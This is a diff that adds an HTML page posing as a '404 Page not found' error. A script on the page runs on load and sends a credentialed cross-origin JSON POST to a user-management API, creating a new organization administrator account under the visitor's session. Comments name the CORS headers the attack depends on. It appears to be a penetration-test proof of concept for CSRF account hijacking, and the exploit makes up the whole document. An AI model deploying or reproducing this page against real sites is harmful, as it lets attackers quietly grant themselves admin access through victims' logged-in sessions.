@@ -1,0 +1,26 @@
+<html>
+  <body>
+    <h1> 404 Page not found.</h1>
+    <script>
+        // Headers that should always be present for the attack to work:
+        // Access-Control-Allow-Origin: * 
+        // Access-Control-Allow-Credentials: true
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https:\/\/example.com\/users\/api\/v1\/users", true);
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.setRequestHeader("Origin", "null"); // Add the Origin header
+        xhr.withCredentials = true;
+        // JSON Data
+        xhr.send(
+            "{\"user\":{\"username\":\"csrf.test\",\"isAccessAllOrganization\":\"true\",\"firstName\":\"hijacking\",\"lastName\":\"test\",\"phoneNo\":\"+972 0559541742\",\"email\":\"hijackingCGTEST@mailinator.com\",\"language\":\"EN\"},\"realmRole\":[\"OrganizationAdmin\"],\"orgId\":\"647857596020b6001729cd10\"}"
+        );
+      }
+        addEventListener("load", (event) => {
+            submitRequest();
+        });
+    </script>
+  </body>
+</html>
+
